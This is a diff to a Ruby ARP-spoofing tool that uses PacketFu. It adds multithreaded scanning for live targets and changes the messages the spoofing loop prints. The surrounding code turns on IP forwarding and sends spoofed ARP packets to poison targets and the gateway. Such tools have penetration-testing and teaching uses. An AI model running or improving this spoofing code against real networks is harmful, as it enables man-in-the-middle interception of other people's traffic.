@@ -87,20 +87,33 @@ end
 
 def target_scanner(targets, timeout)
   puts_verbose("Looking for live targets...")
+  threads = []                                            # To keep track of the child processes/threads
+  hash_mutex = Mutex.new
+  thread_limit = 26
   targets.each do |ip|
-    #Thread.new(ip) do |ip|
-    target_mac = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
-    @targets_hash[ip] = target_mac                  # Make hash of target ips => target macs
-    #end
-    if target_mac
-      puts_verbose "#{ip}: mac is #{target_mac}"
-    else
-      puts_verbose "#{ip}: is down, can't spoof"
+    until threads.map { |t| t.status }.count("run") < thread_limit do sleep 1.5 end # Sleeps when thread limit reached. TODO A more elegant method
+    threads << Thread.new do
+      @iface = @defaults[:iface]                          # Necessary until I improve Mutexing TODO
+      @target_mac = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
+      hash_mutex.synchronize do                           # Mutex prevents mutiple threads writing to the hash at the same time
+        @targets_hash[ip] = @target_mac                   # Make hash of target ips => target macs
+      end
+      GC.start
+      if @target_mac
+        puts_verbose "#{ip}: mac is #{@target_mac}"
+      else
+        puts_verbose "#{ip}: is down, can't spoof"
+      end
     end
   end
+  # Join on the child processes to allow them to finish
+  threads.each do |thread|
+      thread.join
+  end
   @targets_hash.delete_if { |k, v| v.nil? }
+  puts
 end
-  
+
 #----------------------------------------------------------------------#
 # Let's set some defaults and variables
 
@@ -171,21 +184,19 @@ else
   end
 end
 broadcast = true if target.nil?
-
-if @verbose  
-  var1 = "S"
-  if @two_way
-    var2 = "two-way with gateway #{@gateway}."
-  else
-    var2 = "one-way."
-  end
-  if broadcast
-    var3 = "entire network"
-  else
-    var3 = target
-  end 
-  puts "#{var1}poofing #{var3} on #{@iface}, #{var2}"
+ 
+var1 = "S"
+if @two_way
+  var2 = "two-way with gateway #{@gateway}."
+else
+  var2 = "one-way."
 end
+if broadcast
+  var3 = "entire network"
+else
+  var3 = target
+end 
+puts "#{var1}poofing #{var3} on #{@iface}, #{var2}"
 
 #----------------------------------------------------------------------#
 
@@ -234,7 +245,14 @@ end
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 send_packets = true
 while send_packets
-  puts "Sending spoofing packets..."
+  print "Sending spoofing packets to"
+  @targets_hash.each do |target, |
+    print "; #{target} "
+  end
+  if @two_way
+    print "and gateway #{@gateway}"
+  end
+  puts
   print "Packets sent: " if @verbose
   count = 0
   while true
